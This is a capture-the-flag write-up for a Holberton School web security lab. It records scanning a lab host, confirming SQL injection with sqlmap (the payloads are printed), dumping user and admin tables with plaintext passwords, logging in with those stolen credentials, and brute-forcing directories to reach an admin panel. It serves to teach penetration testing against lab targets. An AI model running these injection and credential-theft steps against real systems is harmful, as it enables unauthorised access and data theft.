# Active Reconnaissance

- Ubuntu server, `10.42.134.68`
- cyber_netsec_0x02, `10.42.23.23`
- ssh to ubuntu
```bash
ssh -p 13702 root@ssh.cod-eu-west-3.hbtn.io
# Password: ef646829df094d8cb2643015bce88a02

# install iputils-ping
apt update
apt install -y iputils-ping

# ping cyber_netsec
ping 10.42.23.23
# PING 10.42.23.23 (10.42.23.23) 56(84) bytes of data.
# 64 bytes from 10.42.23.23: icmp_seq=1 ttl=127 time=1.39 ms

# install nmap
apt update && apt install -y nmap

# add active.hbtn to /etc/hosts
echo "10.42.23.23 active.hbtn" >> /etc/hosts

# scan all ports
nmap -p- active.hbtn
# Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-15 19:32 UTC
# Nmap scan report for active.hbtn (10.42.23.23)
# Host is up (0.00060s latency).
# Not shown: 65534 closed ports
# PORT   STATE SERVICE
# 80/tcp open  http
# MAC Address: 0A:C4:AE:24:CC:17 (Unknown)
# 
# Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

## on localhost save the port 80 to file 0-ports.txt
## echo 80 >0-ports.txt
## verify result
```

## Task 1 - inspect website

```bash

# get the HTTP header response
curl -I http://active.hbtn
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 15 Jun 2026 19:47:38 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 4154
# Connection: keep-alive
# Vary: Cookie

## on localhost save "webserver_name webserver_version" to 1-webserver.txt
## echo "nginx 1.18.0" > 1-webserver.txt
## verify result
```

## Task 2: 100-flag.txt

```bash
curl http://active.hbtn
# ...
#     <footer>
#         Copyright &copy; 2023 Holberton School Inc, All rights reserved.
#     </footer>
#     
#     <!-- Dont forget to delete this comment please
#          Holberton Sec Lab - f39ee8f104e2222c280206a72874f43d -->
#     
# </body>
# </html>

## on localhost save the flag to 100-flag.txt
## echo f39ee8f104e2222c280206a72874f43d > 100-flag.txt
## verify result
```

## Task 3: put vulnerable pages in `2-injectable.txt`

```bash

# browse site, search for links, identify vulnerable page
curl -s http://active.hbtn | grep -oE 'href="[^"]+"'
# href="/static/css/style.css"
# href="/static/css/all.css"
# href="/static/css/products.css"
# href="/static/css/home.css"
# href="/"
# href="/products"
# href="/orders"
# href="/contact"
# href="/login"
# href="/product/1"
# href="/product/2"
# href="/product/3"
# href="/product/4"
# href="/product/5"
# href="/product/6"
# href="/product/7"
# href="/product/8"
# href="/product/9"
# href="/product/10"
```

Suspicious: `/product`. 
The other links are all parameter-free static destinations. 
- `/products` (plural) is the catalog listing — it shows all products, takes no input, so there's nothing to inject into. 
- `/contact` and `/login` are forms
- `/` is the homepage. 

None of these look up a single record by an ID we control.

`/product/<id>` is different. Every one of those links — `/product/1`, `/product/2`, … `/product/10` — is the same endpoint with a number on the end. That number is a parameter we supply, and the server almost certainly uses it to fetch one row from a database, something like:
```sql
SELECT * FROM products WHERE id = <id>
```
If that `<id>` gets dropped straight into the query without sanitization, we control part of the SQL — that's the injectable surface.

```bash
## on local terminal
echo "/product" > 2-injectable.txt
## verify result
```


## Task 4: sql injection - database_name and tables_count

```bash
# install sqlmap
apt update && apt install -y sqlmap

# /product/1 seems a good candidate for injection
sqlmap -u "http://active.hbtn/product/1" --batch
#root@ef646829df094d8cb2643015bce88a02-2377118072:~# sqlmap -u "http://active.hbtn/product/1" --batch
#        ___
#       __H__
# ___ ___["]_____ ___ ___  {1.6.4#stable}
#|_ -| . [']     | .'| . |
#|___|_  [,]_|_|_|__,|  _|
#      |_|V...       |_|   https://sqlmap.org
#
#[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
# 
# [*] starting @ 20:48:16 /2026-06-15/
# 
# [20:48:16] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
# do you want to try URI injections in the target URL itself? [Y/n/q] Y
# [20:48:16] [INFO] testing connection to the target URL
# [20:48:17] [INFO] checking if the target is protected by some kind of WAF/IPS
# [20:48:17] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
# are you sure that you want to continue with further target testing? [Y/n] Y
# [20:48:17] [WARNING] please consider usage of tamper scripts (option '--tamper')
# [20:48:17] [INFO] testing if the target URL content is stable
# [20:48:17] [INFO] target URL content is stable
# [20:48:17] [INFO] testing if URI parameter '#1*' is dynamic
# [20:48:17] [INFO] URI parameter '#1*' appears to be dynamic
# [20:48:17] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
# [20:48:17] [INFO] testing for SQL injection on URI parameter '#1*'
# [20:48:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [20:48:18] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Product 1")
# [20:48:18] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
# it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
# for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
# [20:48:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'Generic inline queries'
# [20:48:18] [INFO] testing 'MySQL inline queries'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
# [20:48:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
# [20:48:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [20:48:29] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
# [20:48:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
# [20:48:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
# [20:48:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
# [20:48:30] [INFO] target URL appears to have 4 columns in query
# [20:48:31] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
# URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
# sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
# ---
# Parameter: #1* (URI)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: http://active.hbtn:80/product/1' AND 9905=9905 AND 'JkNc'='JkNc
# 
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: http://active.hbtn:80/product/1' AND (SELECT 9199 FROM (SELECT(SLEEP(5)))LXUs) AND 'kvVH'='kvVH
# 
#     Type: UNION query
#     Title: Generic UNION query (NULL) - 4 columns
#     Payload: http://active.hbtn:80/product/1' UNION ALL SELECT NULL,CONCAT(0x716b6a7a71,0x566a44484e5050555261514c686a6f6f6956557845526d77525479575a527749515555636653594e,0x71716a7071),NULL,NULL-- -
# ---
# [20:48:31] [INFO] the back-end DBMS is MySQL
# web application technology: Nginx 1.18.0
# back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
# [20:48:31] [WARNING] HTTP error codes detected during run:
# 405 (Method Not Allowed) - 1 times, 500 (Internal Server Error) - 43 times
# [20:48:31] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [20:48:31] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 20:48:31 /2026-06-15/
```

The gist of the sqlmap:

- `/product/1` is vulnerable to SQL injection.
- Injection is in the URI path itself: `/product/1`
- Backend database is MySQL, likely MariaDB.
- The query has 4 columns.
- sqlmap found boolean-based blind, time-based blind, and UNION-based injection.


```bash
# list databases
sqlmap -u "http://active.hbtn/product/1" --dbs --batch
# ---
# ---
# [21:03:13] [INFO] the back-end DBMS is MySQL
# web application technology: Nginx 1.18.0
# back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
# [21:03:13] [INFO] fetching database names
# available databases [4]:
# [*] active.hbtn
# [*] information_schema
# [*] mysql
# [*] performance_schema
# 
# [21:03:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [21:03:13] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 21:03:13 /2026-06-15/
```
Ignoring system DBs like:
```sql
information_schema
mysql
performance_schema
sys
```

That leaves us with `active.hbtn`

On local terminal save this:
```bash
echo "active.hbtn" > 3-database.txt
```

### Searching tables in DB `active.hbtn`

```bash
sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" --tables --batch

# ...
# 
# [21:13:09] [INFO] fetching tables for database: 'active.hbtn'
# Database: active.hbtn
# [4 tables]
# +----------+
# | Admins   |
# | Orders   |
# | Products |
# | Users    |
# +----------+
# 
# [21:13:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [21:13:09] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 21:13:09 /2026-06-15/
```

4 tables have bee found:
- Admins
- Orders
- Products
- Users

On local terminal store the result
```bash
echo "4" > 4-tables.txt
```

Verify result.


## Second Flag: 101-flag.txt

```bash
# dump the Users table
sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Users --dump --batch --fresh-queries
# Database: active.hbtn
# Table: Users
# [3 entries]
# +----+--------------------+---------------------+----------+
# | id | email              | password            | username |
# +----+--------------------+---------------------+----------+
# | 1  | yosri@active.hbtn  | 123456789@TJ6OKTXV  | yosri    |
# | 2  | maroua@active.hbtn | admin123@TJ6OKTXV   | maroua   |
# | 3  | abdou@active.hbtn  | abdouabdou@TJ6OKTXV | abdou    |
# +----+--------------------+---------------------+----------+


# try to login to the site with an adminpassword and store the cookie in cookie.txt
curl -i -s -c cookies.txt   -X POST http://active.hbtn/login   -d "username=maroua&password=admin123@TJ6OKTXV"
# HTTP/1.1 302 FOUND
# Server: nginx/1.18.0
# Date: Mon, 15 Jun 2026 22:02:53 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 201
# Connection: keep-alive
# Location: /orders
# Vary: Cookie
# Set-Cookie: session=UF6Ah4V4VjIp7vMFQpN_UdFLaLqS55P120iZLG0JQb0; Expires=Thu, 16 Jul 2026 22:02:53 GMT; HttpOnly; Path=/
# 
# <!doctype html>
# <html lang=en>
# <title>Redirecting...</title>
# <h1>Redirecting...</h1>
# <p>You should be redirected automatically to the target URL: <a href="/orders">/orders</a>. If not, click the link.


# now let's have a look on the /orders page reusing the stored cookie in cookies.txt
curl -s -b cookies.txt http://active.hbtn/orders
# <!-- Proudly Written by Yosri -->
# <!DOCTYPE html>
# <html>
# 
# <head>
#     <meta charset="utf-8" />
#     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
#     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
#     <meta name="description" content="Shop - Active Reconnaissance" />
#     <meta name="author" content="Yosri.me" />
#     <title>Shop - Active Reconnaissance</title>
#     <link href="/static/css/style.css" rel="stylesheet" />
#     <link href="/static/css/all.css" rel="stylesheet" />
#     
#     <link href="/static/css/products.css" rel="stylesheet" />
#     <link href="/static/css/home.css" rel="stylesheet" />
# 
# </head>
# 
# <body>
#     <header>
#         <img src="/static/images/Logo.png" />
#         <ul>
#             <li><a href="/"><i class="fa-solid fa-house"></i>&nbsp;&nbsp;&nbsp;Home</a></li>
#             <li><a href="/products">Products</a></li>
#             <li><a href="/orders">Orders</a></li>
#             <li><a href="/contact">Contact Us</a></li>
#             
#                 <li><a href="/login"><i class="fa-solid fa-user"></i>&nbsp;&nbsp;&nbsp; maroua</a></li>
#             
#             
#         </ul>
#     </header>
# 
#     <main>
#     
# <div class="home">
#         <h1 style="color: black;">Holberton Sec Lab - 9e2150471de4c6b6d70c24a3b9d782de</h1>
# </div>
# 
# 
# 
#     </main>
# 
#     <footer>
#         Copyright &copy; 2023 Holberton School Inc, All rights reserved.
#     </footer>
#     
#     <!-- Dont forget to delete this comment please
#           Holberton Sec Lab - f39ee8f104e2222c280206a72874f43d -->
#     
# </body>
# </html>
```

There are 2 flag-like strings.
Try to save them on local terminal and verify the result.
```bash
# try the flag in <div class="home">
echo 9e2150471de4c6b6d70c24a3b9d782de >101-flag.txt
```

... and the grader evaluates it to 100%


## Task 6 - admin login page > 5-hidden_dir.txt

- New `ubuntu` server ip: `10.42.143.120`
- New `cyber_netsec_0x02` ip: `10.42.5.103`


```bash
# ssh login to ubuntu
ssh -p 13294 root@ssh.cod-eu-west-3.hbtn.io
# Password: 317f04d776734065bfc8908bb97e3610


# install gobuster
sudo apt update
sudo apt install gobuster -y


# download wordlist
curl -L \
  https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-small.txt \
  -o directory-list-2.3-small.txt


# add active.hbtn (`cyber_netsec_0x02` ip: `10.42.5.103`) to /etc/hosts
echo "10.42.5.103 active.hbtn" >> /etc/hosts
# verify
cat /etc/hosts


# go bust the directory (-s: allowed http codes)
gobuster \
  -m dir \
  -u http://active.hbtn \
  -w directory-list-2.3-small.txt \
  -s 200,204,301,307,401,403

# =====================================================
# Gobuster v2.0.1              OJ Reeves (@TheColonial)
# =====================================================
# [+] Mode         : dir
# [+] Url/Domain   : http://active.hbtn/
# [+] Threads      : 10
# [+] Wordlist     : directory-list-2.3-small.txt
# [+] Status codes : 200,204,301,307,401,403
# [+] Timeout      : 10s
# =====================================================
# 2026/06/16 18:11:13 Starting gobuster
# =====================================================
# /contact (Status: 200)
# /products (Status: 200)
# /login (Status: 200)
# /admin (Status: 200)
# Progress: 31336 / 87665 (35.75%)
# =====================================================
# 2026/06/16 18:21:36 Finished
# =====================================================


## in a local terminal save the result (/admin)
echo "/admin" > 5-hidden_dir.txt
cat 5-hidden_dir.txt
## /admin
## verify result with grader
```

## Task 7 - Third Flag > 102-flag.txt

```bash
# install again sqlmap
apt update && apt install -y sqlmap

# we remember from previous flag, we had
# Database: active.hbtn
# Tables: Admins, Orders, Products, Users
# Let's have a look on table Admins
sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Admins --dump --batch --fresh-queries
# Database: active.hbtn
# Table: Admins
# [1 entry]
# +----+-------------------+--------------------+----------+
# | id | email             | password           | username |
# +----+-------------------+--------------------+----------+
# | 1  | admin@active.hbtn | password1@ECXUJL49 | admin    |
# +----+-------------------+--------------------+----------+


# lets try to login with these credentials on the /admin page
curl -i -s -L -c cookies.txt -b cookies.txt \
  -X POST http://active.hbtn/admin \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password1@ECXUJL49"
# HTTP/1.1 302 FOUND
# Server: nginx/1.18.0
# Date: Tue, 16 Jun 2026 18:58:29 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 211
# Connection: keep-alive
# Location: /admin_panel
# Vary: Cookie
# Set-Cookie: session=ko_SnKqGt3HzvjHpw5fVvM7_LLCzBl8NenGfc1wRvyI; Expires=Fri, 17 Jul 2026 18:58:29 GMT; HttpOnly; Path=/
# 
# HTTP/1.1 405 METHOD NOT ALLOWED
# Server: nginx/1.18.0
# Date: Tue, 16 Jun 2026 18:58:29 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 153
# Connection: keep-alive
# Allow: OPTIONS, GET, HEAD
# Set-Cookie: session=ko_SnKqGt3HzvjHpw5fVvM7_LLCzBl8NenGfc1wRvyI; Expires=Fri, 17 Jul 2026 18:58:29 GMT; HttpOnly; Path=/
# Vary: Cookie
# 
# <!doctype html>
# <html lang=en>
# <title>405 Method Not Allowed</title>
# <h1>Method Not Allowed</h1>
# <p>The method is not allowed for the requested URL.</p>
```

Almost there. The last `curl` command accepted the login and we got a redirect (HTTP/1.1 302 FOUND) to Location: `/admin_panel`  \
We're using `curl -L`, so curl tried to follow the redirect with `-X POST` method, but `/admin_panel` is not accepting the `POST` method, so we're getting `# HTTP/1.1 405 METHOD NOT ALLOWED` 

The solution: use the saved cookie and visit `/admin_panel` with `GET` method (curl default).

```bash
# get the /admin_panel and try to grep the flag
curl -s -b cookies.txt http://active.hbtn/admin_panel | grep "Holberton Sec Lab"
#        <h1 style="color: black;">Holberton Sec Lab - 06e22b6de6eec67f9e38f779ff7c6545</h1>
```

Save the flag on a local terminal

```bash
# repo local terminal
echo 06e22b6de6eec67f9e38f779ff7c6545 > 102-flag.txt
cat 102-flag.txt
# 06e22b6de6eec67f9e38f779ff7c6545
```

Commit, push & verify with the grader.